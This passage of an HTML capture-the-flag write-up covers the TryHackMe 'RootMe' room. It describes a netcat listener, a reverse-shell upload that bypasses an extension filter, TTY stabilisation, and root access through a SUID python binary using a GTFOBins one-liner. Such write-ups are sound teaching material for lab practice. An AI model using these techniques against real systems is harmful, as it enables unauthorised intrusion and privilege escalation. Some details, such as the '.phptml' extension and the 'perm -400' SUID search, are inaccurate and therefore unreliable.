+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/8_hu5c223c22e5783dc3c541ab8acbd37458_39106_660x0_resize_box_3.png"
+        alt="Image 8"
+      />
+      
+    </figure>
+</p>
+<p>Before upload it, we need a <strong>listener</strong> as well to get the shell once is sended from the &lsquo;victim&rsquo; host.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">433</span>
+</span></span></code></pre></div><p>Once is all configured, it&rsquo;s time to upload the shell but it denyes the file because its a <strong>.php</strong> file.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/9_hue5dc01f498f6e55bd76fcb8bed51ccec_20246_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/9_hue5dc01f498f6e55bd76fcb8bed51ccec_20246_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/9_hue5dc01f498f6e55bd76fcb8bed51ccec_20246_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/9_hue5dc01f498f6e55bd76fcb8bed51ccec_20246_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/9_hue5dc01f498f6e55bd76fcb8bed51ccec_20246_660x0_resize_box_3.png"
+        alt="Image 9"
+      />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/10_huafd847b414080bc97696e104c23d945d_29702_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/10_huafd847b414080bc97696e104c23d945d_29702_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/10_huafd847b414080bc97696e104c23d945d_29702_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/10_huafd847b414080bc97696e104c23d945d_29702_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/10_huafd847b414080bc97696e104c23d945d_29702_660x0_resize_box_3.png"
+        alt="Image 10"
+      />
+      
+    </figure>
+</p>
+<p>In order to bypass that we need to modify the extension to <strong>.phptml</strong> that is an another valid php extension.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/11_hu287b5b5ea65766edd37a48e98755d580_22683_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/11_hu287b5b5ea65766edd37a48e98755d580_22683_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/11_hu287b5b5ea65766edd37a48e98755d580_22683_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/11_hu287b5b5ea65766edd37a48e98755d580_22683_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/11_hu287b5b5ea65766edd37a48e98755d580_22683_660x0_resize_box_3.png"
+        alt="Image 11"
+      />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/12_hu7f5dfd187e2c4167485fb52508e62427_40061_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/12_hu7f5dfd187e2c4167485fb52508e62427_40061_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/12_hu7f5dfd187e2c4167485fb52508e62427_40061_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/12_hu7f5dfd187e2c4167485fb52508e62427_40061_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/12_hu7f5dfd187e2c4167485fb52508e62427_40061_660x0_resize_box_3.png"
+        alt="Image 12"
+      />
+      
+    </figure>
+</p>
+<p>After the shell is successfully uploaded, we can execute it clicking into the file, giving us the shell.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/13_hu3ced8f49386cbe9c6d57e83f98e77281_28769_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/13_hu3ced8f49386cbe9c6d57e83f98e77281_28769_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/13_hu3ced8f49386cbe9c6d57e83f98e77281_28769_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/13_hu3ced8f49386cbe9c6d57e83f98e77281_28769_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/13_hu3ced8f49386cbe9c6d57e83f98e77281_28769_660x0_resize_box_3.png"
+        alt="Image 13"
+      />
+      
+    </figure>
+</p>
+<p>Once the shell is established we should see something like this.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/14_huac383f30bd1b4bb599bf437a9fd70ed3_171427_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/14_huac383f30bd1b4bb599bf437a9fd70ed3_171427_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/14_huac383f30bd1b4bb599bf437a9fd70ed3_171427_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/14_huac383f30bd1b4bb599bf437a9fd70ed3_171427_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/14_huac383f30bd1b4bb599bf437a9fd70ed3_171427_660x0_resize_box_3.png"
+        alt="Image 14"
+      />
+      
+    </figure>
+
+The user flag is at <strong>/var/www</strong>.</p>
+
+
+<h2 class="relative group">TTY 
+    <div id="tty" class="anchor"></div>
+    
+</h2>
+<hr>
+<p>Now that we have the shell it looks <strong>ugly and fragile</strong> so we can easily lose it with CTRL+C. That commands must be executed in order to work properly.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">script</span> <span class="sr">/dev/nu</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span> 
+</span></span></code></pre></div><p>CTRL+Z</p>
+<pre tabindex="0"><code>stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+</code></pre><p>Once it&rsquo;s configured it&rsquo;s time to escalate privileges.</p>
+
+
+<h2 class="relative group">Privilege escalation 
+    <div id="privilege-escalation" class="anchor"></div>
+    
+</h2>
+<hr>
+<blockquote>
+<p>The Unix and Linux access rights flags setuid and setgid (short for set user identity and set group identity) allow users to run an executable with the file system permissions of the executable&rsquo;s owner or group respectively and to change behaviour in directories.</p>
+</blockquote>
+<p>One of the first things to do when we got a shell is look to suspicius <strong>SUID binaries</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">400</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/nu</span><span class="n">ll</span>
+</span></span></code></pre></div><p><strong>perm -400</strong> Searches for SUID files.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/15_hu6be4a5fb1a7aa1cff22139074942e532_214355_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/15_hu6be4a5fb1a7aa1cff22139074942e532_214355_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/15_hu6be4a5fb1a7aa1cff22139074942e532_214355_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/15_hu6be4a5fb1a7aa1cff22139074942e532_214355_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/15_hu6be4a5fb1a7aa1cff22139074942e532_214355_660x0_resize_box_3.png"
+        alt="Image 15"
+      />
+      
+    </figure>
+</p>
+<p>The python binary has suid, so we can take advantage of it to gain a root shell. In <a href="https://gtfobind.github.io/gtfobins/python/" target="_blank">gtfobins</a> there are plenty of commands to exploit all kind of SUID binaries.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/16_hu4cf0d369725c4078a7a75b579cfe078c_60383_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/16_hu4cf0d369725c4078a7a75b579cfe078c_60383_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/16_hu4cf0d369725c4078a7a75b579cfe078c_60383_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/16_hu4cf0d369725c4078a7a75b579cfe078c_60383_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/16_hu4cf0d369725c4078a7a75b579cfe078c_60383_660x0_resize_box_3.png"
+        alt="Image 16"
+      />
+      
+    </figure>
+</p>
+<p>With this command we&rsquo;re getting a root shell in the machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
+</span></span></code></pre></div><p>With the <strong>whoami</strong> command we can see the current user and confirm if it&rsquo;s done.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/17_hu118812ea622379d66bf1667c93c9791a_8744_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/17_hu118812ea622379d66bf1667c93c9791a_8744_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/17_hu118812ea622379d66bf1667c93c9791a_8744_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/tryhackme-easyw/rootme/img/17_hu118812ea622379d66bf1667c93c9791a_8744_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/tryhackme-easyw/rootme/img/17_hu118812ea622379d66bf1667c93c9791a_8744_660x0_resize_box_3.png"
+        alt="Image 17"
+      />
+      
+    </figure>
+</p>
+<p>The root flag is at <strong>/root</strong>.</p>
+
+        </div>
+        
+        
+
+        
+        
+
+        
+
+
+<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+  
+  
+
+  <a href="/writeups/tryhackme/tryhackme-easyw/basic-pentesting/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/writeups/tryhackme/tryhackme-easyw/basic-pentesting/featured_hu9e26d58d205001afa2d3b376ab31af31_32414_600x0_resize_box_3.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/writeups/tryhackme/tryhackme-easyw/basic-pentesting/">Basic Pentesting</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+</section>
+
+  
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_Writeups\/TryHackMe\/TryHackMe Easyw\/Rootme\/index.md"
+        var oid_likes = "likes_Writeups\/TryHackMe\/TryHackMe Easyw\/Rootme\/index.md"
+      </script>
+      
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      Nurimy
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="//localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
